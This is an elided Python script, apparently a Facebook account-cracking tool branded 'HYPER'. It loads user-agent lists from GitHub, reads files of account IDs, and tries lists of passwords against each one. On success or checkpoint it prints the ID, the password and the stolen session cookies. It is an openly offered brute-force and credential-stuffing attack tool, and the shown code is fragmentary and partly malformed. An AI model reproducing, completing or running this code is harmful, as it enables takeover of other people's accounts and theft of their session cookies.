...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mHYPER')
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/JaberKing420/Ua.txt').text
		ua=open('.bbnew.txt','w')
...
while attemps < 12345677901:
    ...
    if username == 'HYPER' and password == 'KING':
...
def login():
	...
	if HYPER in ['m']:
		...
		os.system('xdg-open https://wa.me/+8801852192547')
	elif HYPER in ['0']:
...
def crack_file():
	...
	print('\033[1;32m [Put File Example:  /sdcard/HYPER.txt  Etc...]')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[😻FREE😻] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
				#HYPER-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•HYPER-Cp] {idf} • {pw}\n\033[0;93[🤟]= COOKIES• \033[0;92m{kuki} ')     
				...
				#HYPER-King
				print(f'\r\033[0;92m[HYPER-➼-OK😻] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
				os.system('espeak -a 300 " HYPER,  Ok,  id"')
